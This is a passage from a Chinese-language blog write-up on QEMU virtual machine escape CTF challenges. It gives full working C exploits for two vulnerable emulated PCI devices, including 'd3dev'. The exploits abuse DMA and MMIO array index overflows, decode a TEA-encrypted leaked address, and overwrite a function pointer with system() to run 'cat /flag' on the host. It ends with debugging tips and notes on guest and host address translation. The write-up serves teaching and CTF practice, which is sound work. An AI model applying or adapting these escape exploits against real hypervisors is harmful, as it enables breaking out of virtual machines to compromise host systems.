<p>这个 <code>exp</code> 先打印了我定义的 <code>enc_addr</code> 这个变量在 <code>qemu</code> 中的虚拟地址，以及在 <code>qemu</code> 中的物理地址，和变量本身的值。当执行完 <code>cpu_physical_memory_rw</code> 函数后再次打印 <code>enc_addr</code> 变量的值（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820680.png" alt="image-20230304175344273"></p>
<p>可以发现 <code>enc_value</code> 从最开始的 <code>0</code> 在 <code>cpu_physical_memory_rw</code> 函数执行后，变成了 <code>0x55835e3b3dd0</code> ，这个地址正是 <code>enc</code> 函数的地址。从而说明了 <code>cpu_physical_memory_rw</code> 函数可以将一个值写入到我们指定的物理内存中</p>
<p>如果能理解上面这个将 <code>enc</code> 函数的地址读到物理地址上的过程，那依次类推，将物理地址中的数据写回 <code>opaque-&gt;dma_buf[v2]</code> 也就很好理解了。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820582.png" alt="image-20230304201045218"></p>
<p>值得一提的是，如果用 <code>IDA</code> 来看这个 <code>v6</code> 后面的赋值会感觉十分难理解，这里反而看汇编会更容易理解。</p>
<p>汇编部分如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820277.png" alt="image-20230304201218093"></p>
<p>通过分析这四行汇编，发现上面给 <code>v6</code> 赋值的代码就是 <code>opaque-&gt;dma_buf[opaque-&gt;dma.dst-0x40000]</code> </p>
<p>所以控制 <code>dma.dst</code> 为 <code>0x41000</code> ，此时就是 <code>dma_buf[0x1000]</code> 这个位置放的就是 <code>enc</code> 函数的地址，<code>cpu_physical_memory_rw(opaque-&gt;dma.src, v6, opaque-&gt;dma.cnt, 0)</code> 函数会将 <code>opaque-&gt;dma.src</code> 中的数据读入到 <code>dma_buf[0x1000]</code> 的位置，因为 <code>dma.src</code> 是物理内存地址，所以我们将 <code>system</code> 函数的物理地址写入 <code>dma.src</code> 。</p>
<p>最后我们依然利用一次 <code>cpu_physical_memory_rw</code> 函数来往虚拟地址中写参数（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820553.png" alt="image-20230304202531687"></p>
<p>此时我们的 <code>v6</code> 要写为参数的地址，这回我们不需要数组索引溢出了，因此我选择了将参数写入到 <code>opaque-&gt;dma_buf[0]</code> 的位置，然后进入 <code>(v4 &amp; 4)!=0</code> 这个分支，去调用 <code>opaque-&gt;enc((char *)v6,cnt_low)</code>  劫持执行流，调用 <code>system(&quot;cat /flag&quot;)</code> </p>
<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMIO_BASE 0xc050</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">page_offset</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gpa</span><span class="params">(<span class="type">void</span> * addr)</span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> page;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    lseek(fd,((<span class="type">uint64_t</span>)addr &gt;&gt; <span class="number">12</span> &lt;&lt; <span class="number">3</span>),<span class="number">0</span>);</span><br><span class="line">    read(fd,&amp;page,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> ((page &amp; <span class="number">0x7fffffffffffff</span>) &lt;&lt; <span class="number">12</span> ) | ((<span class="type">uint64_t</span>)addr &amp; <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">	perror(msg);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr,<span class="type">unsigned</span> size)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *( (<span class="type">uint64_t</span> *)mmio_mem + addr );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> val)</span>&#123;</span><br><span class="line">    *(<span class="type">uint64_t</span> *)(mmio_mem+addr) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000\:00/0000\:00\:04.0/resource0&quot;</span>,O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd==<span class="number">-1</span>)&#123;  perror(<span class="string">&quot;mmio failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);  &#125;</span><br><span class="line"> </span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED,mmio_fd,<span class="number">0</span>);     <span class="comment">//mmap mmio space</span></span><br><span class="line">    <span class="keyword">if</span>(mmio_mem == MAP_FAILED)&#123; perror(<span class="string">&quot;map mmio failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;addr of mmio:%p\n&quot;</span>,mmio_mem);</span><br><span class="line">	<span class="comment">//printf(&quot;mmio_write @ ----&gt; %p\n&quot;,mmio_write);</span></span><br><span class="line">    getchar();</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">//-----------leak libc address----------</span></span><br><span class="line">    <span class="type">uint64_t</span> enc_addr;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enc_addr @ %llx\n&quot;</span>,&amp;enc_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enc_physics_addr @ %llx\n&quot;</span>,gva_to_gpa(&amp;enc_addr));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enc_value @ %llx\n&quot;</span>,enc_addr);</span><br><span class="line">    mmio_write(<span class="number">0x80</span>,<span class="number">0x41000</span>);<span class="comment">//set dma.src</span></span><br><span class="line">    mmio_write(<span class="number">0x88</span>,gva_to_gpa(&amp;enc_addr));<span class="comment">//set dma.dst</span></span><br><span class="line">    mmio_write(<span class="number">0x90</span>,<span class="number">0x8</span>);<span class="comment">//set dma.cnt</span></span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">0x1</span>|<span class="number">2</span>);<span class="comment">//set dma.cmd call dma_timer</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enc_value @ %llx\n&quot;</span>,enc_addr);</span><br><span class="line">    <span class="type">uint64_t</span> call_system_addr=enc_addr<span class="number">-0x862b8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;system_addr @ %llx\n&quot;</span>,call_system_addr);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//----------write system address---------</span></span><br><span class="line">    mmio_write(<span class="number">0x80</span>,gva_to_gpa(&amp;call_system_addr));<span class="comment">//set dma.src</span></span><br><span class="line">    mmio_write(<span class="number">0x88</span>,<span class="number">0x41000</span>);<span class="comment">//set dma.dst</span></span><br><span class="line">    mmio_write(<span class="number">0x90</span>,<span class="number">0x8</span>);<span class="comment">//set dma.cnt</span></span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">0x1</span>);<span class="comment">//set dma.cmd call dma_timer</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//----------Control parameters-----------</span></span><br><span class="line">    <span class="type">char</span> *command=<span class="string">&quot;cat /flag;cat /root/flag;cat flag;pwd&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;command address is %llx&quot;</span>,command);</span><br><span class="line">    mmio_write(<span class="number">0x80</span>,gva_to_gpa(command));<span class="comment">//set dma.src</span></span><br><span class="line">    mmio_write(<span class="number">0x88</span>,<span class="number">0x40000</span>);<span class="comment">//set dma.dst</span></span><br><span class="line">    mmio_write(<span class="number">0x90</span>,<span class="built_in">strlen</span>(command));<span class="comment">//set dma.cnt</span></span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">0x1</span>|<span class="number">0x4</span>);<span class="comment">//set dma.cmd call dma_timer</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820957.png" alt="image-20230304172709467"></p>
<h3 id="d3dev"><a href="#d3dev" class="headerlink" title="d3dev"></a>d3dev</h3><h4 id="题目附件"><a href="#题目附件" class="headerlink" title="题目附件"></a>题目附件</h4><p>链接: <a href="https://pan.baidu.com/s/1z1-Wk30RJEmQTSsEzVtvig?pwd=t9gp">https://pan.baidu.com/s/1z1-Wk30RJEmQTSsEzVtvig?pwd=t9gp</a> 提取码: t9gp </p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820851.png" alt="image-20230316145717263" style="zoom:50%;" />

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820351.png" alt="image-20230316145949280" style="zoom: 67%;" />

<p>通过观察对比 <code>class_init</code> 函数中的数据，发现 <code>d3dev</code> 设备号为 <code>00:03.0</code> </p>
<p>数组索引溢出漏洞位于 <code>d3dev_mmio_write</code> 函数</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820215.png" alt="image-20230316150429029" style="zoom:50%;" />

<p>这里的 <code>v4</code> 来自于 <code>v4 = opaque-&gt;seek + (unsigned int)(addr &gt;&gt; 3);</code> </p>
<p><code>seek</code> 和 <code>addr</code> 都可控，也就意味着 <code>v4</code> 可控。这样我们就可以通过索引溢出来控制 <code>rand_r</code> 函数指针（如下），在 <code>d3dev_pmio_write</code> 函数中，调用了 <code>rand_r</code> 函数，如果将 <code>rand_r</code> 改成 <code>system</code> 函数，则可以触发后门。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821297.png" alt="image-20230316151852507"></p>
<p>需要注意的是如果使用 <code>seek</code> 默认为 <code>0</code> ，那么<code>addr</code> 需要为 <code>0x818</code> 。但是 <code>MMIO</code> 区域为 <code>0x800</code> ，因此使用 <code>0x818</code> 的话 <code>PCI</code> 设备在内部会检查到这里发生了越界（如下）。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821884.png" alt="image-20230316152939181" style="zoom:50%;" />



<p>所以这里还需要控制 <code>seek</code> 为 <code>0x100</code> ，控制 <code>addr</code> 为 <code>0x18</code> , 才能让 <code>blocks[v4]</code> 正好落在 <code>rand_r</code> 的位置。</p>
<h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><p>因为本题开了 <code>PIE</code> ，即使程序中给了 <code>system</code> 函数，依然需要泄露程序的基地址。</p>
<p>泄露地址这里涉及一个 <code>tea</code> 加解密</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821914.png" alt="image-20230316153307989"></p>
<p>这里是可以越界读取 <code>rand_r</code> 的地址，但是读取的结果会放到 <code>v5</code> ，经过了 <code>tea</code> 加密后，最终 <code>return</code> 将其返回，此处的 <code>key[0] key[1] key[2] key[3]</code> 在 <code>d3dev_pmio_write</code> 函数中都可以被设置为 <code>0</code> （如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161819077.png" alt="image-20230316154127664" style="zoom:50%;" />

<p>因此最后的解密脚本应该如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">decode</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>])</span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        i -= <span class="number">0x61C88647</span>;</span><br><span class="line">        v[<span class="number">0</span>] += ((v[<span class="number">1</span>]&lt;&lt;<span class="number">4</span>))^(v[<span class="number">1</span>]+i)^((v[<span class="number">1</span>]&gt;&gt;<span class="number">5</span>));</span><br><span class="line">        v[<span class="number">1</span>] += ((v[<span class="number">0</span>]&lt;&lt;<span class="number">4</span>))^(v[<span class="number">0</span>]+i)^((v[<span class="number">0</span>]&gt;&gt;<span class="number">5</span>));</span><br><span class="line">    &#125; <span class="keyword">while</span>(i!=<span class="number">0xC6EF3720</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样将接收到的密文用这个函数解密，即可得到 <code>rand_r</code> 函数的地址。</p>
<p>用 <code>mmio_write</code> 函数写入 <code>system</code> 地址的时候，需要先加密后写入，不然只能写入四个字节。</p>
<p>最后控制参数的话，假设我们想执行 <code>cat flag</code> 这个命令，那么需要把 <code>r_seed</code> 设置为 <code>cat </code>，因为 <code>r_seed</code> 的大小就为四字节，所以只能存放 <code>cat </code>，而 <code>r_seed</code> 下面的数据就是 <code>blocks</code> ,所以在 <code>blocks[0]</code> 的位置存放字符串 <code>flag</code> </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821106.png" alt="image-20230316160923121"></p>
<p>执行 <code>cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource</code> 命令，获取 <code>0xfebf1000</code> 为 <code>MMIO</code> 基地址，<code>0xc040</code>  为 <code>PMIO</code> 基地址</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161819207.png" alt="image-20230316161803354" style="zoom:50%;" />

<h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMIO_BASE 0xc040</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">	perror(msg);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint64_t</span> *)(mmio_mem+addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> val)</span>&#123;</span><br><span class="line">    *(<span class="type">uint64_t</span> *)(mmio_mem+addr) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> inl(PMIO_BASE+addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> val)</span>&#123;</span><br><span class="line">    outl(val, PMIO_BASE+addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decode</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>])</span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        i -= <span class="number">0x61C88647</span>;</span><br><span class="line">        v[<span class="number">0</span>] += ((v[<span class="number">1</span>]&lt;&lt;<span class="number">4</span>))^(v[<span class="number">1</span>]+i)^((v[<span class="number">1</span>]&gt;&gt;<span class="number">5</span>));</span><br><span class="line">        v[<span class="number">1</span>] += ((v[<span class="number">0</span>]&lt;&lt;<span class="number">4</span>))^(v[<span class="number">0</span>]+i)^((v[<span class="number">0</span>]&gt;&gt;<span class="number">5</span>));</span><br><span class="line">    &#125; <span class="keyword">while</span>(i!=<span class="number">0xC6EF3720</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">encode</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>])</span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> i = <span class="number">0xC6EF3720</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        v[<span class="number">1</span>] -= ((v[<span class="number">0</span>]&lt;&lt;<span class="number">4</span>))^(v[<span class="number">0</span>]+i)^((v[<span class="number">0</span>]&gt;&gt;<span class="number">5</span>));</span><br><span class="line">        v[<span class="number">0</span>] -= ((v[<span class="number">1</span>]&lt;&lt;<span class="number">4</span>))^(v[<span class="number">1</span>]+i)^((v[<span class="number">1</span>]&gt;&gt;<span class="number">5</span>));</span><br><span class="line">        i += <span class="number">0x61C88647</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000\:00/0000\:00\:03.0/resource0&quot;</span>,O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd==<span class="number">-1</span>)&#123;  perror(<span class="string">&quot;mmio failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);  &#125;</span><br><span class="line"> </span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED,mmio_fd,<span class="number">0</span>);     <span class="comment">//mmap mmio space</span></span><br><span class="line">    <span class="keyword">if</span>(mmio_mem == MAP_FAILED)&#123; perror(<span class="string">&quot;map mmio failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;addr of mmio:%p\n&quot;</span>,mmio_mem);</span><br><span class="line">    <span class="keyword">if</span>(iopl(<span class="number">3</span>)!=<span class="number">0</span>)&#123;perror(<span class="string">&quot;iopl failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);&#125;</span><br><span class="line">    getchar();</span><br><span class="line">    pmio_write(<span class="number">4</span>,<span class="number">0x0</span>);<span class="comment">//set the key to 0</span></span><br><span class="line">    pmio_write(<span class="number">8</span>,<span class="number">0x100</span>);<span class="comment">//set the seek to 0x100 to prevent addr from overflow the MMIO area</span></span><br><span class="line">    <span class="type">uint64_t</span> rand_r=mmio_read(<span class="number">0x18</span>);<span class="comment">//get address after the tea encode</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rand_r address before decode is @%lx\n&quot;</span>,rand_r);</span><br><span class="line">    decode(&amp;rand_r);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rand_r address after decode is @%llx\n&quot;</span>,rand_r);</span><br><span class="line">    <span class="type">uint64_t</span> sys_addr=rand_r+<span class="number">0xa5e0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;system address is @%llx\n&quot;</span>,sys_addr);</span><br><span class="line">    encode(&amp;sys_addr);</span><br><span class="line">    mmio_write(<span class="number">0x18</span>,sys_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> args=<span class="number">0x67616c66</span>;</span><br><span class="line">    pmio_write(<span class="number">8</span>,<span class="number">0x0</span>);<span class="comment">//set the seek to 0</span></span><br><span class="line">    encode(&amp;args);</span><br><span class="line">    mmio_write(<span class="number">0x0</span>,args);  <span class="comment">// flag</span></span><br><span class="line">    pmio_write(<span class="number">0x1C</span>, <span class="number">0x20746163</span>);  <span class="comment">// cat</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821302.png" alt="image-20230316162420666" style="zoom: 67%;" />



<h2 id="奇奇怪怪的技能"><a href="#奇奇怪怪的技能" class="headerlink" title="奇奇怪怪的技能"></a>奇奇怪怪的技能</h2><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>执行 <code>launch.sh</code> 脚本，将 <code>qemu</code> 启动起来，然后用 <code>ps -a | grep qemu</code> 来查看 <code>qemu</code> 的进程号，接着 <code>sudo gdb qemu-system-x86_64</code>  来开 <code>gdb</code> ，再输入 <code>attach pid</code>  附加进程开始调试（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302261609688.png" alt="image-20230226160922771"></p>
<p>假设我们现在想从 <code>qemu-system</code> 中的 <code>vn_mmio_read</code> 函数这里开始调试，那么我们下该函数的断点（本题的 <code>qemu-system</code> 并没有开 <code>PIE</code> ，所以直接下断点即可，如果开 <code>PIE</code> 的话别忘记加基地址），并在 <code>qemu</code> 中运行 <code>exp</code> （如下），从而来调试查看我们关注的信息</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302261610355.png" alt="image-20230226161041668"></p>
<h3 id="qemu中的虚拟内存与物理内存"><a href="#qemu中的虚拟内存与物理内存" class="headerlink" title="qemu中的虚拟内存与物理内存"></a>qemu中的虚拟内存与物理内存</h3><p>在这之前要先明白两点，第一点是客户机 指的是运行在虚拟机中的操作系统及其应用程序。而宿主机 则指的是运行虚拟机的物理机 。第二，<code>qemu</code> 跑在宿主机里，本质上就是一个进程，和其他进程没有任何区别</p>
<p>所以接下来有四个地址，分别是 客户机的物理地址，客户机的虚拟地址，宿主机的物理地址，宿主机的虚拟地址</p>
<ul>
<li><p>宿主机的物理地址：指的是物理内存条上的地址，即硬件直接访问的物理地址。</p>
</li>
<li><p>宿主机的虚拟地址：操作系统所呈现给我们的虚假地址，它们被用来访问宿主机上的进程</p>
</li>
<li><p>客户机的物理地址：由 <code>qemu</code> 程序执行了 <code>mmap</code> 函数，映射了一片内存空间出来，作为客户机的物理地址</p>
</li>
<li><p>客户机的虚拟地址：客户机里的操作系统将刚刚映射出来的那片内存空间经过转换，呈现给我们了一个虚假地址</p>
</li>
</ul>
<p>此时如果再去仔细分析下面这个图 （来自 <a href="https://bbs.kanxue.com/thread-265501.htm">https://bbs.kanxue.com/thread-265501.htm</a> ）  的话，就大概能体会到这些地址直接的关系了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                       Guest&#x27; processes</span><br><span class="line">                     +--------------------+</span><br><span class="line">Virtual addr space   |                    |</span><br><span class="line">                     +--------------------+                                    （GVA）</span><br><span class="line">                     |                    |</span><br><span class="line">                     \__   Page Table     \__</span><br><span class="line">                        \                    \</span><br><span class="line">                         |                    |  Guest kernel</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">Guest&#x27;s phy. memory |    |                    |                |            （GPA）</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">                    |                                          |</span><br><span class="line">                    \__                                        \__</span><br><span class="line">                       \                                          \</span><br><span class="line">                        |             QEMU process                 |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">Virtual addr space |    |                                          |         （HVA）</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">                   |                                               |</span><br><span class="line">                    \__                Page Table                   \__</span><br><span class="line">                       \                                               \</span><br><span class="line">                        |                                               |</span><br><span class="line">                   +----+-----------------------------------------------++</span><br><span class="line">Physical memory    |    |                                               ||    （HPA）</span><br><span class="line">                   +----+-----------------------------------------------++</span><br></pre></td></tr></table></figure>



<h4 id="虚拟地址转换物理地址的过程"><a href="#虚拟地址转换物理地址的过程" class="headerlink" title="虚拟地址转换物理地址的过程"></a>虚拟地址转换物理地址的过程</h4><p>然后简单说一下将虚拟地址转换为物理地址的思路</p>
<p>每个进程都有自己的页表（存储在 <code>/proc/self/pagemap</code> 文件中），页表由一个或多个页表项组成，每个页表项记录了一个虚拟页到物理页的映射关系，在 <code>64</code> 位 <code>Linux</code> 系统中，页表项为 <code>64</code> 位。</p>
<p>现在给出一个虚拟地址，将其右移 <code>9</code> 位的话，得到的是页表项偏移量（页表项在页表中的偏移）,这里 <code>&amp; ~7</code> 是将页表项偏移量向下对齐到8字节边界上（因为页表项是八字节，这里是要八字节对齐）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">offset = (addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span></span><br></pre></td></tr></table></figure>



<p>得到页表项偏移量之后，我们就可以去用 <code>lseek</code> 和 <code>read</code> 函数从 <code>pagemap</code> 文件中读取一个页表项的信息，读取出来的信息包括：</p>
<ul>
<li><p>bit 0-54 存储物理页帧号</p>
</li>
<li><p>bit 55-62 为保留位</p>
</li>
<li><p>bit 63 存储页面是否存在</p>
<p>如果存储页面存在的话，那我们就读取它的物理页帧号，最终要获取物理的地址的话，需要物理页帧号和页面内偏移量（虚拟地址将其右移 <code>12</code> 位），因此我们最后的物理地址是将物理页帧号左移 <code>12</code> 位，将其或（ <code>|</code> ）上页面内偏移量，即可得到物理地址。</p>
</li>
</ul>
<h4 id="程序验证"><a href="#程序验证" class="headerlink" title="程序验证"></a>程序验证</h4><p>用网上其他师傅的一个程序来验证一下</p>
